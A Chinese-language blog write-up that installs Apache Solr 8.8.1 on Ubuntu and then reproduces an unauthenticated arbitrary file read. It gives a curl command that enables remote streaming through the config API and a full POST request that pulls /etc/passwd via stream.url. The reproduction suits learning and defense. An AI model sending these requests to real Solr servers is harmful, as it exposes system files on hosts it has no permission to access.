NO.1 安装solr环境

在ubuntu下安装solr

目前solr版本已经到8.8.1版本：

https://downloads.apache.org/lucene/solr/8.8.1/

直接使用wget下载solr8.8.1

wget https://downloads.apache.org/lucene/solr/8.8.1/solr-8.8.1.tgz

使用tar解压：

tar -zxvf solr-8.8.1.tgz

解压好之后直接在当目录执行安装脚本

sudo solr-8.8.1/bin/install_solr_service.sh solr-8.8.1.tgz

脚本执行完之后会发现solr已经安装成功并运行起来了，可以使用/opt/solr/bin/solr status查看一下状态：

浏览器访问localhost:8983可以正常访问了

创建core

有两种方法可以创建core，注：这里必须要以solr用户的身份来创建

· 直接在明令行创建：

su - solr -c "/opt/solr/bin/solr create_core -c test_core1

提示输入密码后创建成功。
如果不知道密码（反正我不知道），直接passwd solr修改solr用户密码

我们也通过web页面查看是否创建成功：

· 第二种方法就是可以直接在web管理台创建

Core Admin --> Add Core

如果出现如下报错，我们记住报错中的路径：

我们需要复制配置文件到我们新建的core文件夹中（报错的路径里）：

cp -r /opt/solr-8.8.1/server/solr/configsets/_default/conf /var/solr/data/new_core

然后再回去重新按照上面的步骤创建core就可以成功创建了

至此环境准备就绪！



NO.2 漏洞复现

访问solr管理页面确认我们创建的core已经存在

如图，我们可以直接访问test_core01的config接口
http://ip:8983/solr/test_core01/config

1. 首先访问

http://ip:8983/solr/admin/cores?indexInfo=false&wt=json

我们会得到对应信息

{  "responseHeader":{    "status":0,    "QTime":0},  "initFailures":{},  "status":{    "test_core01":{      "name":"test_core01",      "instanceDir":"/var/solr/data/test_core01",      "dataDir":"/var/solr/data/test_core01/data/",      "config":"solrconfig.xml",      "schema":"managed-schema",      "startTime":"2021-03-19T08:37:13.985Z",      "uptime":9779530}}}

test_core01就是我们要利用的core对象。

接下来我们构造payload

POST /solr/test_core01/debug/dump?param=ContentStreams&wt=json HTTP/1.1Host: **.***.**.**:8983User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:57.0) Gecko/20100101 Firefox/57.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://10.211.55.29:8983/solr/test_core01/debug/dump?param=ContentStreams&wt=jsonContent-Type: application/x-www-form-urlencodedContent-Length: 29Connection: closeUpgrade-Insecure-Requests: 1
stream.url=file:///etc/passwd

但是我们会得到Remote Streaming is disabled Remote Streaming没有启用。

2. 开启enableRemoteStreaming：我们通过以下方式在未授权的情况下修改config api配置，实际上官方文档已经给我们写的很清楚了，详情可以参考官方guide：

https://solr.apache.org/guide/8_0/content-streams.html

我们按照官方给出的方法使用curl修改配置，也可以通过burpsuite构造post包：

curl -H 'Content-type:application/json' -d '{"set-property": {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}' 'http://localhost:8983/solr/techproducts/config'

如图，配置修改成功，RemoteStreaming开启成功后我们再回过头去执行payload就可以成功执行了

以上就是复现过程了，漏洞本身比较简单。



NO.3 题外话

RemoteStreaming默认是关闭的，但是如果攻击者可以在未授权的情况下修改配置，就能引发问题。所以根本问题还是Apache Solr后台没有启用身份验证，所以官方可能觉得这不是个问题吧...
